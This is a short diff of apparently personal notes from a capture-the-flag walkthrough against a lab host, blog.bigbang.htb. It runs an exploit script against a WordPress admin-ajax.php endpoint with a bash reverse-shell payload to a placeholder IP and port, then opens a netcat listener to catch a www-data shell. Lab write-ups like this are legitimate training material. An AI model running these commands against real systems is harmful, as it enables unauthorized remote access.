@@ -52,7 +52,7 @@ def get_symbols_and_addresses:
 
 comment out left lines in check_vulnerable about zlib
 
-python3 http://blog.bigbang.htb/wp-admin/admin-ajax.php "bash -c 'bash -i >& /dev/tcp/<myip>/<myport> 0>&1'"
+python3 cnext-exploit.py http://blog.bigbang.htb/wp-admin/admin-ajax.php "bash -c 'bash -i >& /dev/tcp/<myip>/<myport> 0>&1'"
 nc -lvnp <myport> -> get www-data shell
 
 -- Until shawking
